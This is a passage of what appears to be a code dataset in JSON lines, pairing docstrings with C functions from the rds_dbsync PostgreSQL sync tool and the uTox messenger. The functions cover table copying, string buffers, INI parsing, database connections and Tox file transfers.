%s\",\n\t\t\t\t\t\t\t PQerrorMessage(target_conn));\n\t\t\t\tgoto exit;\n\t\t\t}\n\t\t\targs->count++;\n\t\t\tcurr->count++;\n\t\t\tPQfreemem(copybuf);\n\t\t}\n\n\t\tif (bytes != -1)\n\t\t{\n\t\t\tfprintf(stderr,\"reading from origin table failed source connection returned %d: %s\",\n\t\t\t\t\t\tbytes, PQerrorMessage(origin_conn));\n\t\t\tgoto exit;\n\t\t}\n\n\t\t/* Send local finish */\n\t\tif (PQputCopyEnd(target_conn, NULL) != 1)\n\t\t{\n\t\t\tfprintf(stderr,\"sending copy-completion to destination connection failed destination connection reported: %s\",\n\t\t\t\t\t\t PQerrorMessage(target_conn));\n\t\t\tgoto exit;\n\t\t}\n\n\t\tPQclear(res2);\n\t\tres2 = PQgetResult(target_conn);\n\t\tif (PQresultStatus(res2) != PGRES_COMMAND_OK)\n\t\t{\n\t\t\tfprintf(stderr, \"COPY failed for table \\\"%s\\\": %s\",\n\t\t\t\t\t\t\t\t relname, PQerrorMessage(target_conn));\n\t\t\tgoto exit;\n\t\t}\n\n\t\tfinish_copy_origin_tx(origin_conn);\n\t\tfinish_copy_target_tx(target_conn);\n\t\tcurr->complete = true;\n\t\tPQclear(res1);\n\t\tPQclear(res2);\n\t\tresetStringInfo(&query);\n\n\t\tGETTIMEOFDAY(&after);\n\t\tDIFF_MSEC(&after, &before, elapsed_msec);\n\t\tfprintf(stderr,\"thread %d migrate task %d table %s.%s %ld rows complete, time cost %.3f ms\\n\",\n\t\t\t\t\t\t args->id, curr->id, nspname, relname, curr->count, elapsed_msec);\n\t}\n\t\n\targs->all_ok = true;\n\nexit:\n\n\tPQfinish(origin_conn);\n\tPQfinish(target_conn);\n\tThreadExit(0);\n\treturn NULL;\n}", "path": "rds_dbsync/dbsync/pgsync.c", "commit_date": "2017-01-16 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * quote_literal_cstr -\n *\t  returns a properly quoted literal\n */\n", "func_signal": "static void\nquote_literal_local(Decoder_handler *hander, const char *rawstr, char *type, PQExpBuffer buffer)", "code": "{\n\tchar\t   *result;\n\tint\t\t\tlen;\n\tint\t\t\tnewlen;\n\tStringInfo\ts = hander->buffer;\n\tbool need_process = true;\n\n\tif (strcmp(type, \"smallint\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"integer\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"bigint\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"oid\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"real\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"double precision\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"numeric\") == 0)\n\t\tneed_process = false;\n\n\tif (need_process == false)\n\t{\n\t\tappendPQExpBuffer(buffer, \"%s\", rawstr);\n\t\treturn;\n\t}\n\n\tif (strcmp(type, \"timestamp without time zone\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"timestamp with time zone\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"time without time zone\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"time with time zone\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"money\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"date\") == 0)\n\t\tneed_process = false;\n\telse if (strcmp(type, \"interval\") == 0)\n\t\tneed_process = false;\n\n\tif (need_process == false)\n\t{\n\t\tappendPQExpBuffer(buffer, \"'\");\n\t\tappendPQExpBuffer(buffer, \"%s\", rawstr);\n\t\tappendPQExpBuffer(buffer, \"'\");\n\t\treturn;\n\t}\n\n\tlen = strlen(rawstr);\n\tresetStringInfo(s);\n\tappendStringInfoSpaces(s, len * 2 + 3);\n\n\tresult = s->data;\n\n\tnewlen = quote_literal_internal(result, rawstr, len);\n\tresult[newlen] = '\\0';\n\n\tappendPQExpBuffer(buffer, \"%s\", result);\n\n\treturn;\n}", "path": "rds_dbsync/dbsync/utils.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * appendStringInfo\n *\n * Format text data under the control of fmt (an sprintf-style format string)\n * and append it to whatever is already in str.  More space is allocated\n * to str if necessary.  This is sort of like a combination of sprintf and\n * strcat.\n */\n", "func_signal": "void\nappendStringInfo(StringInfo str, const char *fmt,...)", "code": "{\n\tfor (;;)\n\t{\n\t\tva_list\t\targs;\n\t\tint\t\t\tneeded;\n\n\t\t/* Try to format the data. */\n\t\tva_start(args, fmt);\n\t\tneeded = appendStringInfoVA(str, fmt, args);\n\t\tva_end(args);\n\n\t\tif (needed == 0)\n\t\t\tbreak;\t\t\t\t/* success */\n\n\t\t/* Increase the buffer size and try again. */\n\t\tenlargeStringInfo(str, needed);\n\t}\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/* Returns the next string in the split data */\n", "func_signal": "static char* next(ini_t *ini, char *p)", "code": "{\n  p += strlen(p);\n  while (p < ini->end && *p == '\\0') {\n    p++;\n  }\n  return p;\n}", "path": "rds_dbsync/dbsync/ini.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * Connect to the server. Returns a valid PGconn pointer if connected,\n * or NULL on non-permanent error. On permanent error, the function will\n * call exit(1) directly.\n */\n", "func_signal": "PGconn *\nGetConnection(char *connection_string)", "code": "{\n\tPGconn\t   *tmpconn;\n\tint\t\t\targcount = 7;\t/* dbname, replication, fallback_app_name,\n\t\t\t\t\t\t\t\t * host, user, port, password */\n\tint\t\t\ti;\n\tconst char **keywords;\n\tconst char **values;\n\tconst char *tmpparam;\n\tPQconninfoOption *conn_opts = NULL;\n\tPQconninfoOption *conn_opt;\n\tchar\t   *err_msg = NULL;\n\tchar\t*progname = \"ali_logicaldecode\";\n\n\t/*\n\t * Merge the connection info inputs given in form of connection string,\n\t * options and default values (dbname=replication, replication=true, etc.)\n\t */\n\ti = 0;\n\tif (connection_string)\n\t{\n\t\tconn_opts = PQconninfoParse(connection_string, &err_msg);\n\t\tif (conn_opts == NULL)\n\t\t{\n\t\t\tfprintf(stderr, \"%s: %s\", progname, err_msg);\n\t\t\texit(1);\n\t\t}\n\n\t\tfor (conn_opt = conn_opts; conn_opt->keyword != NULL; conn_opt++)\n\t\t{\n\t\t\tif (conn_opt->val != NULL && conn_opt->val[0] != '\\0')\n\t\t\t\targcount++;\n\t\t}\n\n\t\tkeywords = pg_malloc0((argcount + 1) * sizeof(*keywords));\n\t\tvalues = pg_malloc0((argcount + 1) * sizeof(*values));\n\n\t\tfor (conn_opt = conn_opts; conn_opt->keyword != NULL; conn_opt++)\n\t\t{\n\t\t\tif (conn_opt->val != NULL && conn_opt->val[0] != '\\0')\n\t\t\t{\n\t\t\t\tkeywords[i] = conn_opt->keyword;\n\t\t\t\tvalues[i] = conn_opt->val;\n\t\t\t\ti++;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tkeywords = pg_malloc0((argcount + 1) * sizeof(*keywords));\n\t\tvalues = pg_malloc0((argcount + 1) * sizeof(*values));\n\t}\n\n\tkeywords[i] = \"replication\";\n\t//values[i] = dbname == NULL ? \"true\" : \"database\";\n\tvalues[i] = \"database\";\n\ti++;\n\tkeywords[i] = \"fallback_application_name\";\n\tvalues[i] = \"ali_logicaldecode\";\n\ti++;\n\n\tkeywords[i] = NULL;\n\tvalues[i] = NULL;\n\n\ttmpconn = PQconnectdbParams(keywords, values, true);\n\n\t/*\n\t * If there is too little memory even to allocate the PGconn object\n\t * and PQconnectdbParams returns NULL, we call exit(1) directly.\n\t */\n\tif (!tmpconn)\n\t{\n\t\tfprintf(stderr, _(\"%s: could not connect to server\\n\"),\n\t\t\t\tprogname);\n\t\texit(1);\n\t}\n\n\tif (PQstatus(tmpconn) != CONNECTION_OK)\n\t{\n\t\tfprintf(stderr, _(\"%s: could not connect to server: %s\\n\"),\n\t\t\t\tprogname, PQerrorMessage(tmpconn));\n\t\tPQfinish(tmpconn);\n\t\tfree(values);\n\t\tfree(keywords);\n\t\tif (conn_opts)\n\t\t\tPQconninfoFree(conn_opts);\n\t\treturn NULL;\n\t}\n\n\t/* Connection ok! */\n\tfree(values);\n\tfree(keywords);\n\tif (conn_opts)\n\t\tPQconninfoFree(conn_opts);\n\n\t/*\n\t * Ensure we have the same value of integer timestamps as the server we\n\t * are connecting to.\n\t */\n\ttmpparam = PQparameterStatus(tmpconn, \"integer_datetimes\");\n\tif (!tmpparam)\n\t{\n\t\tfprintf(stderr,\n\t\t _(\"%s: could not determine server setting for integer_datetimes\\n\"),\n\t\t\t\tprogname);\n\t\tPQfinish(tmpconn);\n\t\texit(1);\n\t}\n\n#ifdef HAVE_INT64_TIMESTAMP\n\tif (strcmp(tmpparam, \"on\") != 0)\n#else\n\tif (strcmp(tmpparam, \"off\") != 0)\n#endif\n\t{\n\t\tfprintf(stderr,\n\t\t\t _(\"%s: integer_datetimes compile flag does not match server\\n\"),\n\t\t\t\tprogname);\n\t\tPQfinish(tmpconn);\n\t\texit(1);\n\t}\n\n\treturn tmpconn;\n}", "path": "rds_dbsync/dbsync/utils.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/* Splits data in place into strings containing section-headers, keys and\n * values using one or more '\\0' as a delimiter. Unescapes quoted values */\n", "func_signal": "static void split_data(ini_t *ini)", "code": "{\n  char *value_start, *line_start;\n  char *p = ini->data;\n\n  while (p < ini->end) {\n    switch (*p) {\n      case '\\r':\n      case '\\n':\n      case '\\t':\n      case ' ':\n        *p = '\\0';\n        /* Fall through */\n\n      case '\\0':\n        p++;\n        break;\n\n      case '[':\n        p += strcspn(p, \"]\\n\");\n        *p = '\\0';\n        break;\n\n      case ';':\n        p = discard_line(ini, p);\n        break;\n\n      default:\n        line_start = p;\n        p += strcspn(p, \"=\\n\");\n\n        /* Is line missing a '='? */\n        if (*p != '=') {\n          p = discard_line(ini, line_start);\n          break;\n        }\n        trim_back(ini, p - 1);\n\n        /* Replace '=' and whitespace after it with '\\0' */\n        do {\n          *p++ = '\\0';\n        } while (*p == ' ' || *p == '\\r' || *p == '\\t');\n\n        /* Is a value after '=' missing? */\n        if (*p == '\\n' || *p == '\\0') {\n          p = discard_line(ini, line_start);\n          break;\n        }\n\n        if (*p == '\"') {\n          /* Handle quoted string value */\n          value_start = p;\n          p = unescape_quoted_value(ini, p);\n\n          /* Was the string empty? */\n          if (p == value_start) {\n            p = discard_line(ini, line_start);\n            break;\n          }\n\n          /* Discard the rest of the line after the string value */\n          p = discard_line(ini, p);\n\n        } else {\n          /* Handle normal value */\n          p += strcspn(p, \"\\n\");\n          trim_back(ini, p - 1);\n        }\n        break;\n    }\n  }\n}", "path": "rds_dbsync/dbsync/ini.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * appendStringInfoChar\n *\n * Append a single byte to str.\n * Like appendStringInfo(str, \"%c\", ch) but much faster.\n */\n", "func_signal": "void\nappendStringInfoChar(StringInfo str, char ch)", "code": "{\n\t/* Make more room if needed */\n\tif (str->len + 1 >= str->maxlen)\n\t\tenlargeStringInfo(str, 1);\n\n\t/* OK, append the character */\n\tstr->data[str->len] = ch;\n\tstr->len++;\n\tstr->data[str->len] = '\\0';\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * resetStringInfo\n *\n * Reset the StringInfo: the data buffer remains valid, but its\n * previous content, if any, is cleared.\n */\n", "func_signal": "void\nresetStringInfo(StringInfo str)", "code": "{\n\tstr->data[0] = '\\0';\n\tstr->len = 0;\n\tstr->cursor = 0;\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/* Complete active file, (when the whole file transfer is successful). */\n", "func_signal": "static void utox_complete_file(FILE_TRANSFER *file)", "code": "{\n    FILE_TRANSFER *msg = calloc(1, sizeof(FILE_TRANSFER));\n    if (!msg) {\n        LOG_ERR(\"FileTransfer\", \"Unable to malloc for internal message. (This is bad!)\");\n        return;\n    }\n\n    *msg = *file;\n    postmessage_utox(FILE_STATUS_UPDATE, file->status, 0, msg);\n\n    if (file->status == FILE_TRANSFER_STATUS_ACTIVE) {\n        file->status = FILE_TRANSFER_STATUS_COMPLETED;\n        if (file->incoming) {\n            if (file->inline_img) {\n                decode_inline_png(file->friend_number, file->via.memory, file->current_size);\n                postmessage_utox(FILE_INCOMING_NEW_INLINE_DONE, file->friend_number, 0, file);\n            } else if (file->avatar) {\n                postmessage_utox(FRIEND_AVATAR_SET, file->friend_number, file->current_size, file->via.avatar);\n            }\n        }\n        file->decon_wait = true;\n        postmessage_utox(FILE_STATUS_UPDATE_DATA, file->status, 0, file);\n    } else {\n        LOG_ERR(\"FileTransfer\", \"Unable to complete file in non-active state (file:%u)\" , file->file_number);\n    }\n    LOG_NOTE(\"FileTransfer\", \"File transfer is done (%u & %u)\" , file->friend_number, file->file_number);\n    postmessage_utox(FILE_STATUS_DONE, file->status, 0, file->ui_data);\n\n    if (file->resumeable) {\n        ft_decon_resumable(file);\n    }\n\n    ft_decon(file->friend_number, file->file_number);\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Cancel active file. */\n", "func_signal": "static void kill_file(FILE_TRANSFER *file)", "code": "{\n    switch (file->status) {\n        case FILE_TRANSFER_STATUS_KILLED: {\n            LOG_WARN(\"FileTransfer\", \"File already killed.\");\n            return;\n        }\n\n        case FILE_TRANSFER_STATUS_COMPLETED: {\n            LOG_WARN(\"FileTransfer\", \"File already completed.\");\n            return;\n        }\n\n        default: {\n            break;\n        }\n    }\n\n    file->status = FILE_TRANSFER_STATUS_KILLED;\n    postmessage_utox(FILE_STATUS_DONE, file->status, 0, file->ui_data);\n\n    if (file->resumeable) {\n        ft_decon_resumable(file);\n    }\n\n    ft_decon(file->friend_number, file->file_number);\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "// TODO: DRY. This function exists in both posix/filesys.c and in android/main.c\n// Make a posix native_get_file that you pass a complete path to instead of letting it construct\n// one would fix this.\n", "func_signal": "static void opts_to_sysmode(UTOX_FILE_OPTS opts, char *mode)", "code": "{\n    if (opts & UTOX_FILE_OPTS_READ) {\n        mode[0] = 'r';\n    }\n\n    if (opts & UTOX_FILE_OPTS_APPEND) {\n        mode[0] = 'a';\n    } else if (opts & UTOX_FILE_OPTS_WRITE) {\n        mode[0] = 'w';\n    }\n\n    mode[1] = 'b';\n\n    if ((opts & (UTOX_FILE_OPTS_WRITE | UTOX_FILE_OPTS_APPEND)) && (opts & UTOX_FILE_OPTS_READ)) {\n        mode[2] = '+';\n    }\n\n    mode[3] = 0;\n\n    return;\n}", "path": "uTox/src/android/main.c", "commit_date": "2020-06-20 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Break active file, (when a friend goes offline). */\n", "func_signal": "static void break_file(FILE_TRANSFER *file)", "code": "{\n    if (!file) {\n        return;\n    }\n\n    switch (file->status) {\n        case FILE_TRANSFER_STATUS_NONE: {\n            return kill_file(file);\n        }\n\n        case FILE_TRANSFER_STATUS_COMPLETED:\n        case FILE_TRANSFER_STATUS_KILLED: {\n            // We don't break files that are already broken.\n            return;\n        }\n\n        default: {\n            break;\n        }\n    }\n\n    file->status = FILE_TRANSFER_STATUS_BROKEN;\n    postmessage_utox(FILE_STATUS_DONE, file->status, 0, file->ui_data);\n\n    if (file->resumeable) {\n        ft_update_resumable(file);\n    }\n\n    ft_decon(file->friend_number, file->file_number);\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Free/Remove/Unlink the file transfer resume info file. */\n", "func_signal": "static void ft_decon_resumable(FILE_TRANSFER *ft)", "code": "{\n    char name[UTOX_FILE_NAME_LENGTH];\n    if (!resumeable_name(ft, name)) {\n        return;\n    }\n\n    LOG_INFO(\"FileTransfer\", \"Going to decon file %s.\" , name);\n    FILE *file = utox_get_file(name, NULL, UTOX_FILE_OPTS_READ | UTOX_FILE_OPTS_WRITE);\n    if (!file) {\n        return;\n    }\n\n    fclose(file);\n    utox_get_file(name, NULL, UTOX_FILE_OPTS_DELETE);\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Create the file transfer resume info file. */\n", "func_signal": "static bool ft_init_resumable(FILE_TRANSFER *ft)", "code": "{\n    char name[UTOX_FILE_NAME_LENGTH];\n    if (!resumeable_name(ft, name)) {\n        return false;\n    }\n\n    ft->resume_file = utox_get_file(name, NULL, UTOX_FILE_OPTS_WRITE | UTOX_FILE_OPTS_MKDIR);\n    if (!ft->resume_file) {\n        return false;\n    }\n\n    LOG_INFO(\"FileTransfer\", \".ftinfo for file %.*s set; ready to resume!\" , (uint32_t)ft->name_length, ft->name);\n    return ft_update_resumable(ft);\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Draw an invite to be a friend window */\n", "func_signal": "static void draw_friend_request(int x, int y, int w, int h)", "code": "{\n    FREQUEST *req = flist_get_sel_frequest();\n    if (!req) {\n        LOG_ERR(\"Layout Friend\", \"Unable to draw a friend request without a friend request.\");\n        return;\n    }\n\n    setcolor(COLOR_MAIN_TEXT);\n    setfont(FONT_SELF_NAME);\n    drawstr(x + SCALE(10), SCALE(20), FRIENDREQUEST);\n\n    if (req->msg && req->length) {\n        setfont(FONT_TEXT);\n        utox_draw_text_multiline_within_box(x + SCALE(10), y + SCALE(70), w + x, y, y + h, font_small_lineheight,\n                                            req->msg, req->length, ~0, ~0, 0, 0, true);\n    }\n}", "path": "uTox/src/layout/friend.c", "commit_date": "2020-04-20 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Friend has come online, restart our outgoing transfers to this friend. */\n", "func_signal": "void ft_friend_online(Tox *tox, uint32_t friend_number)", "code": "{\n    for (uint16_t i = 0; i < MAX_FILE_TRANSFERS; i++) {\n        FILE_TRANSFER *file = calloc(1, sizeof(FILE_TRANSFER));\n        if (!file) {\n            LOG_FATAL_ERR(EXIT_MALLOC, \"FileTransfer\", \"Could not alloc file transfer struct\");\n        }\n        file->friend_number = friend_number;\n        file->file_number   = i;\n        file->incoming      = false;\n        ft_find_resumeable(file);\n        if (file->path[0]) {\n            /* If we got a path from utox_file_load we should try to resume! */\n            file->via.file = fopen((char *)file->path, \"rb+\");\n            ft_send_file(tox, friend_number, file->via.file, file->path, strlen((char *)file->path), file->data_hash);\n        }\n\n        char name[UTOX_FILE_NAME_LENGTH];\n        if (resumeable_name(file, name)) {\n            LOG_INFO(\"FileTransfer\", \"Loading outgoing %u, deleting origin file.\", i);\n            utox_get_file(name, NULL, UTOX_FILE_OPTS_DELETE);\n        }\n\n        free(file);\n    }\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Called by toxcore to deliver the next chunk of incoming data. */\n", "func_signal": "static void incoming_file_callback_chunk(Tox *tox, uint32_t friend_number, uint32_t file_number,\n                                         uint64_t position, const uint8_t *data, size_t length, void *UNUSED(user_data))", "code": "{\n    LOG_INFO(\"FileTransfer\", \"Incoming chunk friend(%u), file(%u), start(%lu), end(%lu), \\n\",\n            friend_number, file_number, position, length);\n\n    FILE_TRANSFER *ft = get_file_transfer(friend_number, file_number);\n    if (!ft || !ft->in_use) {\n        LOG_ERR(\"FileTransfer\", \"ERROR incoming chunk for an out of use file transfer!\");\n        return;\n    }\n\n    if (length == 0) {\n        utox_complete_file(ft);\n        return;\n    }\n\n    if (ft->inline_img && ft->via.memory) {\n        if (position == 0) {\n            uint8_t png_header[] = {0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a };\n            if (memcmp(data, png_header, 8) != 0) {\n                // this isn't a png header, just die\n                LOG_ERR(\"FileTransfer\", \"Friend %u sent an inline image thats' not a PNG\" , friend_number);\n                ft_local_control(tox, friend_number, file_number, TOX_FILE_CONTROL_CANCEL);\n                return;\n            }\n        }\n        memcpy(ft->via.memory + position, data, length);\n    } else if (ft->avatar && ft->via.avatar) {\n        memcpy(ft->via.avatar + position, data, length);\n    } else if (ft->via.file) {\n        uint8_t count = 10;\n        while (!file_lock(ft->via.file, position, length)) {\n            LOG_ERR(\"FileTransfer\", \"Can't get lock, sleeping...\");\n            yieldcpu(10);\n            if (count == 0) {\n                break;\n            }\n            count--;\n            // If you get a bug report about this hanging utox, just disable it, it's unlikely to be needed!\n        }\n        fseeko(ft->via.file, position, SEEK_SET);\n        size_t write_size = fwrite(data, 1, length, ft->via.file);\n        fflush(ft->via.file);\n        file_unlock(ft->via.file, position, length);\n        if (write_size != length) {\n            LOG_ERR(\"FileTransfer\", \"\\n\\nFileTransfer:\\tERROR WRITING DATA TO FILE! (%u & %u)\\n\\n\", friend_number, file_number);\n            ft_local_control(tox, friend_number, file_number, TOX_FILE_CANCEL);\n            return;\n        }\n        calculate_speed(ft);\n    } else {\n        LOG_TRACE(\"FileTransfer\", \"File Handle failed!\");\n        ft_local_control(tox, friend_number, file_number, TOX_FILE_CANCEL);\n        return;\n    }\n\n    ft->current_size += length;\n    if (ft->resume_update) {\n        --ft->resume_update;\n    } else {\n        ft_update_resumable(ft);\n        ft->resume_update = 20; // every 20 packets we update\n    }\n    // TODO dirty hack, this needs to be replaced\n    // moved it cal_speed() // ft_update_resumable(ft);\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Start/Resume active file. */\n", "func_signal": "static void run_file_local(FILE_TRANSFER *file)", "code": "{\n    switch (file->status) {\n        case FILE_TRANSFER_STATUS_NONE: {\n            file->status = FILE_TRANSFER_STATUS_ACTIVE;\n            if (!file->resumeable && file->incoming) {\n                file->resumeable = ft_init_resumable(file);\n            }\n            break;\n        }\n\n        case FILE_TRANSFER_STATUS_PAUSED_US: {\n            file->status = FILE_TRANSFER_STATUS_ACTIVE;\n            break;\n        }\n\n        case FILE_TRANSFER_STATUS_PAUSED_BOTH: {\n            file->status = FILE_TRANSFER_STATUS_PAUSED_THEM;\n            break;\n        }\n\n        case FILE_TRANSFER_STATUS_ACTIVE:\n        case FILE_TRANSFER_STATUS_PAUSED_THEM: {\n            return;\n        }\n\n        case FILE_TRANSFER_STATUS_BROKEN:\n        case FILE_TRANSFER_STATUS_COMPLETED:\n        case FILE_TRANSFER_STATUS_KILLED: {\n            LOG_ERR(\"FileTransfer\", \"We tried to run file from an unknown state! (%u)\" , file->status);\n            return;\n        }\n    }\n\n    FILE_TRANSFER *msg = calloc(1, sizeof(FILE_TRANSFER));\n    if (!msg) {\n        LOG_ERR(\"FileTransfer\", \"Unable to malloc for internal message. (This is bad!)\");\n        return;\n    }\n\n    *msg = *file;\n    postmessage_utox(FILE_STATUS_UPDATE, file->status, 0, msg);\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
{"docstring": "/* Function called by core with a new file send request from a friend. */\n", "func_signal": "static void incoming_file_callback_request(Tox *tox, uint32_t friend_number, uint32_t file_number, uint32_t kind,\n                                           uint64_t size, const uint8_t *name, size_t name_length,\n                                           void *UNUSED(user_data))", "code": "{\n    LOG_NOTE(\"FileTransfer\", \"New incoming file transfer request from friend %u\" , friend_number);\n\n    FRIEND *f = get_friend(friend_number);\n    if (f->ft_incoming_active_count >= MAX_INCOMING_COUNT) {\n        LOG_ERR(\"FileTransfer\", \"Too many incoming file transfers from friend %u\", friend_number);\n        /* ft_local_control is preferred, but in this case it can't access the ft struct. */\n        tox_file_control(tox, friend_number, file_number, TOX_FILE_CANCEL, NULL);\n        return;\n    }\n\n    if (kind == TOX_FILE_KIND_AVATAR) {\n        return incoming_avatar(tox, friend_number, file_number, size);\n    }\n\n    if (settings.accept_inline_images\n        && size < MAX_INLINE_FILESIZE\n        && name_length == (sizeof(\"utox-inline.png\") - 1)\n        && memcmp(name, \"utox-inline.png\", name_length) == 0)\n    {\n        return incoming_inline_image(tox, friend_number, file_number, size);\n    }\n\n    FILE_TRANSFER *ft = make_file_transfer(friend_number, file_number);\n    if (!ft) {\n        LOG_ERR(\"FileTransfer\", \"Unable to get memory handle for transfer, canceling friend/file number (%u/%u)\",\n              friend_number, file_number);\n        tox_file_control(tox, friend_number, file_number, TOX_FILE_CONTROL_CANCEL, 0);\n        return;\n    }\n    f->ft_incoming_active_count++;\n\n    memset(ft, 0, sizeof(FILE_TRANSFER));\n    ft->in_use = true;\n\n    // Preload some data needed by ft_find_resumeable\n    ft->friend_number = friend_number;\n    ft->file_number   = file_number;\n    ft->incoming      = true;\n    tox_file_get_file_id(tox, friend_number, file_number, ft->data_hash, NULL);\n    ft->name = calloc(1, name_length + 1);\n    if (!ft->name) {\n        LOG_FATAL_ERR(EXIT_MALLOC, \"FileTransfer\", \"Could not allocate space for file name (%uB)\",\n                      name_length + 1);\n    }\n    snprintf((char *)ft->name, name_length + 1, \"%.*s\", (int)name_length, name);\n    ft->name_length = name_length;\n\n    /* access the correct memory location for this file */\n    /* Load saved information about this file */\n    if (ft_find_resumeable(ft)) {\n        LOG_NOTE(\"FileTransfer\", \"Incoming Existing file from friend (%u) \" , friend_number);\n        FILE *file = fopen((const char *)ft->path, \"rb+\");\n        if (file) {\n            LOG_INFO(\"FileTransfer\", \"Cool file exists, let try to restart it.\");\n            ft->in_use        = true;\n            ft->in_memory     = false;\n            ft->avatar        = false;\n            ft->friend_number = friend_number;\n            ft->file_number   = file_number;\n            ft->target_size   = size;\n            ft->via.file      = file;\n\n            FILE_TRANSFER *msg = calloc(1, sizeof(FILE_TRANSFER));\n            if (!msg) {\n                LOG_ERR(\"FileTransfer\", \"Unable to malloc for internal message. (This is bad!)\");\n                return;\n            }\n            *msg = *ft;\n            postmessage_utox(FILE_SEND_NEW, friend_number, file_number, msg);\n            TOX_ERR_FILE_SEEK error = 0;\n            tox_file_seek(tox, friend_number, file_number, ft->current_size, &error);\n            if (error) {\n                LOG_ERR(\"FileTransfer\", \"seek error %i\" , error);\n                // TODO UI error here as well;\n                ft_local_control(tox, friend_number, file_number, TOX_FILE_CONTROL_CANCEL);\n                return;\n            }\n            LOG_INFO(\"FileTransfer\", \"seek & resume\");\n            ft->status = FILE_TRANSFER_STATUS_NONE;\n            ft_local_control(tox, friend_number, file_number, TOX_FILE_CONTROL_RESUME);\n            ft->resumeable = ft_init_resumable(ft);\n            return;\n        }\n        LOG_ERR(\"FileTransfer\", \"Unable to open file suggested by resume!\");\n        // This is fine-ish, we'll just fallback to new incoming file.\n    }\n\n    ft->friend_number = friend_number;\n    ft->file_number   = file_number;\n\n    ft->target_size = size;\n\n    ft->resumeable = ft_init_resumable(ft);\n\n    FILE_TRANSFER *msg = calloc(1, sizeof(FILE_TRANSFER));\n    if (!msg) {\n        LOG_ERR(\"FileTransfer\", \"Unable to malloc for internal message. (This is bad!)\");\n        return;\n    }\n\n    *msg = *ft;\n    postmessage_utox(FILE_INCOMING_NEW, friend_number, detox_incoming_file_number(file_number), msg);\n    /* The file doesn't exist on disk where we expected, let's prompt the user to accept it as a new file */\n    LOG_NOTE(\"FileTransfer\", \"New incoming file from friend (%u) file number (%u)\\nFileTransfer:\\t\\tfilename: %s\",\n          friend_number, file_number, name);\n    /* Auto accept if it's a utox-inline image, with the correct size */\n}", "path": "uTox/src/file_transfers.c", "commit_date": "2019-04-22 00:00:00", "repo_name": "uTox/uTox", "stars": 1002, "license": "other", "language": "c", "size": 14574}
